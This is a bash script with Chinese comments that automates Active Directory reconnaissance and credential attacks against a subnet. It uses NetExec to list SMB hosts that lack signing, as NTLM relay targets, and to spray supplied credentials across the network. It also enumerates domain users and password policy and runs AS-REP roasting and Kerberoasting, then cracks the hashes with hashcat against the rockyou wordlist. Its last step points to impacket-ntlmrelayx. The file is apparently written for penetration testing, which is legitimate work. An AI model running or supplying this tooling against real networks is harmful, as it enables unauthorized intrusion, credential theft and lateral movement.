#!/usr/bin/env bash
# ad-sweep.sh — 域内一把梭侦察:签名状态 + 可中继清单 + (有凭据则)验证/枚举/AS-REP/Kerberoast
# 用法: ad-sweep.sh <网段CIDR> [域控IP] [用户] [密码]
# 示例: ad-sweep.sh 10.10.10.0/24
#       ad-sweep.sh 10.10.10.0/24 10.10.10.10 jsmith 'Passw0rd!'
set -euo pipefail

usage() { echo "用法: $0 <网段CIDR> [域控IP] [用户] [密码]"; exit 1; }
[ $# -lt 1 ] && usage
NET="$1"; DCIP="${2:-}"; U="${3:-}"; PASS="${4:-}"
source "$(dirname "$(readlink -f "$0")")/lib/project.sh"
source "$(dirname "$(readlink -f "$0")")/lib/state.sh"
OUT="$(resolve_project || echo "$HOME/tools/loot")/$(date +%Y%m%d-%H%M%S)-${NET//\//_}"
mkdir -p "$OUT"; cd "$OUT"

echo "[*] 输出目录: $OUT"
echo "[1/4] SMB 存活 + 签名状态 + 域名 ..."
# 先落盘再截断显示:避免 head 提前退出导致 SIGPIPE/pipefail 中断扫描
nxc smb "$NET" -u '' -p '' --gen-relay-list "$OUT/relay-list.txt" > "$OUT/smb-scan.txt" 2>/dev/null || true
head -20 "$OUT/smb-scan.txt"; touch "$OUT/relay-list.txt"
echo "    可中继目标(签名未强制): $(wc -l < "$OUT/relay-list.txt") 台 → relay-list.txt"

# 存活主机 → state 主机清单;签名关闭主机 → 中继发现(fail-safe,无项目静默跳过)
while read -r IP; do
    [ -n "$IP" ] && state_host_add "$IP" || true
done < <(awk '/^SMB/ {print $2}' "$OUT/smb-scan.txt" 2>/dev/null)
while read -r IP; do
    [ -n "$IP" ] && state_finding_add "SMB 签名关闭可中继" 中 "$OUT/relay-list.txt" "$IP" || true
done < "$OUT/relay-list.txt"

if [ -n "$U" ] && [ -n "$PASS" ]; then
    echo "[2/4] 凭据全段验证 ..."
    nxc smb "$NET" -u "$U" -p "$PASS" --continue-on-success 2>/dev/null | tee "$OUT/cred-check.txt" | grep -c '\[+\]' | xargs -I{} echo "    命中 {} 台 → cred-check.txt"

    if [ -n "$DCIP" ]; then
        echo "[3/4] 域用户枚举 + 口令策略 ..."
        nxc ldap "$DCIP" -u "$U" -p "$PASS" --users 2>/dev/null > "$OUT/users.txt" && echo "    域用户 → users.txt ($(wc -l < "$OUT/users.txt") 行)"
        nxc smb "$DCIP" -u "$U" -p "$PASS" --pass-pol 2>/dev/null | tee "$OUT/passpol.txt"

        echo "[4/4] 低垂果实:AS-REP / Kerberoast ..."
        nxc ldap "$DCIP" -u "$U" -p "$PASS" --asreproast "$OUT/asrep.txt" 2>/dev/null | tail -1
        nxc ldap "$DCIP" -u "$U" -p "$PASS" --kerberoasting "$OUT/kerberoast.txt" 2>/dev/null | tail -1
        [ -s "$OUT/asrep.txt" ] && hashcat -m 18200 "$OUT/asrep.txt" /usr/share/wordlists/rockyou.txt --show | tee "$OUT/cracked.txt" || true
        [ -s "$OUT/kerberoast.txt" ] && hashcat -m 13100 "$OUT/kerberoast.txt" /usr/share/wordlists/rockyou.txt --show | tee -a "$OUT/cracked.txt" || true
        echo "    已破解(--show 只显示此前跑过的,新哈希需手动 hashcat) → cracked.txt"
    fi
else
    echo "[2-4/4] 未提供凭据,跳过验证/枚举(空会话已完成的签名+relay 见上)"
    [ -s "$OUT/relay-list.txt" ] && echo "    下一步: sudo impacket-ntlmrelayx -tf $OUT/relay-list.txt -smb2support(见 10 号文档阶段 1)"
fi
echo "[*] 全部产出在: $OUT"
